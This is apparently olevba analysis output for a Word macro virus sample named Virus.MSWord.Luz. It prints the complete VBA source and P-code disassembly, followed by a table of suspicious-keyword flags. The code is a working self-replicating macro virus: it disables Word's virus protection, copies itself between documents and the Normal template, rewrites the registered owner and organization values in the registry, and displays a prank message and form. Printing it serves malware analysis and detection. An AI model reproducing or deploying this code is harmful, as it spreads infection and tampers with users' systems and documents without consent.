olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Luz
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Luz - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 1
Private Sub Document_Close()
On Error Resume Next

'This is very important information
'please, do not delete or modify !!!

Dim x, Contor As Integer
Dim SaveDocument, SaveNormalTemplate, DocInf, NorInf As Boolean
Dim AD, NT As Object
Dim OurCode, OurCode2, LogData, LogFile, Temp As String

Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DocInf = AD.CodeModule.Find("Am0r", 1, 1, 10000, 10000)
NorInf = NT.CodeModule.Find("Am0r", 1, 1, 10000, 10000)
Contor = 0

Options.VirusProtection = False
Options.SaveNormalPrompt = False

If (DocInf = True Xor NorInf = True) And _
(ActiveDocument.SaveFormat = wdFormatDocument Or _
 ActiveDocument.SaveFormat = wdFormatTemplate) Then
 Randomize
 x = Int(Rnd * 20)
 If x = 10 Then MsgBox "Your name is " & Application.UserName, vbInformation, "Unrequested Info"
 
 If DocInf = True Then
   SaveNormalTemplate = NormalTemplate.Saved
   OurCode = AD.CodeModule.lines(2, AD.CodeModule.countoflines - 1)
   OurCode = "' 1" & Chr(13) & OurCode
   NT.CodeModule.deletelines 1, NT.CodeModule.countoflines
   NT.CodeModule.addfromstring OurCode
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Luz Clarita"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Am0r A La Mexicana"
   ActiveDocument.VBProject.VBComponents.Item(2).Export ("c:\MS Office Luz.frm")
   NormalTemplate.VBProject.VBComponents.Import ("c:\MS Office Luz.frm")
   If SaveNormalTemplate = True Then NormalTemplate.Save
 End If
 
 If NorInf = True And _
   (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
    ActiveDocument.Saved = False) Then
   SaveDocument = ActiveDocument.Saved
   OurCode = NT.CodeModule.lines(1, NT.CodeModule.countoflines)
    OurCode2 = OurCode
    Contor = Int(Trim(Mid(OurCode2, 2, 3))) + 1
    OurCode2 = NT.CodeModule.lines(2, NT.CodeModule.countoflines - 1)
    Temp = Trim("'" & Str(Contor) & Chr(13))
    OurCode2 = Temp + OurCode2
   AD.CodeModule.deletelines 1, AD.CodeModule.countoflines
   AD.CodeModule.addfromstring OurCode
   NT.CodeModule.deletelines 1, NT.CodeModule.countoflines
   NT.CodeModule.addfromstring OurCode2
   NormalTemplate.VBProject.VBComponents.Item(2).Export ("c:\MS Office Luz.frm")
   ActiveDocument.VBProject.VBComponents.Import ("c:\MS Office Luz.frm")
   If SaveDocument = True Then ActiveDocument.Save
 End If
End If
If Contor >= 66 Then
 MsgBox "Hello! " & _
 "My name is Luz Clarita and I'm a very friendly macro-virus." & _
 Chr(13) & "You should share your documents with your friends... :-)" & _
 Chr(13) & "I salut you from Romania!", vbExclamation, "SALUT!"
 Joculetz.Show
End If
End Sub

Private Sub Document_New()

End Sub




























-------------------------------------------------------------------------------
VBA MACRO Joculetz.frm 
in file: Virus.MSWord.Luz - OLE stream: 'Macros/VBA/Joculetz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





Private Sub CommandButton1_Click()
Joculetz.Hide
CommandButton1.Caption = "Aha"
End Sub

Private Sub UserForm_Activate()
a = 1
b = 5
Do
 Label1.Font.Size = Label1.Font.Size + a
 CommandButton1.Left = CommandButton1.Left + b
 If Label1.Font.Size >= 35 Then a = -a
 If CommandButton1.Left >= Joculetz.Width - 70 Then b = -b
 If Label1.Font.Size < 8 Then a = -a
 If CommandButton1.Left < 20 Then b = -b
 For i = 1 To 100
   CommandButton1.Caption = Str(i)
 Next i
 CommandButton1.Caption = "Okay"
 dummy = DoEvents
Loop Until CommandButton1.Caption = "Aha"
End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Luz
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5804 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	QuoteRem 0x0000 0x0022 "This is very important information"
' Line #5:
' 	QuoteRem 0x0000 0x0023 "please, do not delete or modify !!!"
' Line #6:
' Line #7:
' 	Dim 
' 	VarDefn x
' 	VarDefn Contor (As Integer)
' Line #8:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocInf
' 	VarDefn NorInf (As Boolean)
' Line #9:
' 	Dim 
' 	VarDefn AD
' 	VarDefn NT (As Object)
' Line #10:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn OurCode2
' 	VarDefn LogData
' 	VarDefn LogFile
' 	VarDefn Temp (As String)
' Line #11:
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #14:
' 	LitStr 0x0004 "Am0r"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocInf 
' Line #15:
' 	LitStr 0x0004 "Am0r"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NorInf 
' Line #16:
' 	LitDI2 0x0000 
' 	St Contor 
' Line #17:
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #20:
' Line #21:
' 	LineCont 0x0008 0B 00 00 00 12 00 01 00
' 	Ld DocInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NorInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #22:
' 	ArgsCall Read 0x0000 
' Line #23:
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #24:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "Your name is "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x0010 "Unrequested Info"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #25:
' Line #26:
' 	Ld DocInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #27:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #28:
' 	LitDI2 0x0002 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St OurCode 
' Line #29:
' 	LitStr 0x0003 "' 1"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld OurCode 
' 	Concat 
' 	St OurCode 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #31:
' 	Ld OurCode 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #32:
' 	LitStr 0x000B "Luz Clarita"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #33:
' 	LitStr 0x0012 "Am0r A La Mexicana"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #34:
' 	LitStr 0x0014 "c:\MS Office Luz.frm"
' 	Paren 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' 	LitStr 0x0014 "c:\MS Office Luz.frm"
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #36:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	LineCont 0x0008 05 00 03 00 13 00 04 00
' 	Ld NorInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #40:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #41:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St OurCode 
' Line #42:
' 	Ld OurCode 
' 	St OurCode2 
' Line #43:
' 	Ld OurCode2 
' 	LitDI2 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim 0x0001 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Contor 
' Line #44:
' 	LitDI2 0x0002 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St OurCode2 
' Line #45:
' 	LitStr 0x0001 "'"
' 	Ld Contor 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ArgsLd Trim 0x0001 
' 	St Temp 
' Line #46:
' 	Ld Temp 
' 	Ld OurCode2 
' 	Add 
' 	St OurCode2 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #48:
' 	Ld OurCode 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #49:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #50:
' 	Ld OurCode2 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #51:
' 	LitStr 0x0014 "c:\MS Office Luz.frm"
' 	Paren 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #52:
' 	LitStr 0x0014 "c:\MS Office Luz.frm"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #53:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	Ld Contor 
' 	LitDI2 0x0042 
' 	Ge 
' 	IfBlock 
' Line #57:
' 	LineCont 0x000C 03 00 01 00 05 00 01 00 0C 00 01 00
' 	LitStr 0x0007 "Hello! "
' 	LitStr 0x003B "My name is Luz Clarita and I'm a very friendly macro-virus."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0038 "You should share your documents with your friends... :-)"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0019 "I salut you from Romania!"
' 	Concat 
' 	Ld vbExclamation 
' 	LitStr 0x0006 "SALUT!"
' 	ArgsCall MsgBox 0x0003 
' Line #58:
' 	Ld Joculetz 
' 	ArgsMemCall Show 0x0000 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	EndSub 
' Line #61:
' Line #62:
' 	FuncDefn (Private Sub Document_New())
' Line #63:
' Line #64:
' 	EndSub 
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Macros/VBA/Joculetz - 2405 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #6:
' 	Ld Joculetz 
' 	ArgsMemCall Hide 0x0000 
' Line #7:
' 	LitStr 0x0003 "Aha"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #8:
' 	EndSub 
' Line #9:
' Line #10:
' 	FuncDefn (Private Sub UserForm_Activate())
' Line #11:
' 	LitDI2 0x0001 
' 	St a 
' Line #12:
' 	LitDI2 0x0005 
' 	St B 
' Line #13:
' 	Do 
' Line #14:
' 	Ld Label1 
' 	MemLd Font 
' 	MemLd Size 
' 	Ld a 
' 	Add 
' 	Ld Label1 
' 	MemLd Font 
' 	MemSt Size 
' Line #15:
' 	Ld CommandButton1 
' 	MemLd LBound 
' 	Ld B 
' 	Add 
' 	Ld CommandButton1 
' 	MemSt LBound 
' Line #16:
' 	Ld Label1 
' 	MemLd Font 
' 	MemLd Size 
' 	LitDI2 0x0023 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld a 
' 	UMi 
' 	St a 
' 	EndIf 
' Line #17:
' 	Ld CommandButton1 
' 	MemLd LBound 
' 	Ld Joculetz 
' 	MemLd With 
' 	LitDI2 0x0046 
' 	Sub 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld B 
' 	UMi 
' 	St B 
' 	EndIf 
' Line #18:
' 	Ld Label1 
' 	MemLd Font 
' 	MemLd Size 
' 	LitDI2 0x0008 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld a 
' 	UMi 
' 	St a 
' 	EndIf 
' Line #19:
' 	Ld CommandButton1 
' 	MemLd LBound 
' 	LitDI2 0x0014 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld B 
' 	UMi 
' 	St B 
' 	EndIf 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	For 
' Line #21:
' 	Ld i 
' 	ArgsLd Str 0x0001 
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #22:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' 	LitStr 0x0004 "Okay"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #24:
' 	Ld DoEvents 
' 	St dummy 
' Line #25:
' 	Ld CommandButton1 
' 	MemLd Caption 
' 	LitStr 0x0003 "Aha"
' 	Eq 
' 	LoopUntil 
' Line #26:
' 	EndSub 
' Line #27:
' Line #28:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #29:
' Line #30:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Luz' - OLE stream: 'Macros/Joculetz/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Okay�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Luz' - OLE stream: 'Macros/Joculetz/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Luz' - OLE stream: 'Macros/Joculetz/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Luz Clarita Telenovelas Star
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Luz' - OLE stream: 'Macros/Joculetz/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Luz' - OLE stream: 'Macros/Joculetz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Luz' - OLE stream: 'Macros/Joculetz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

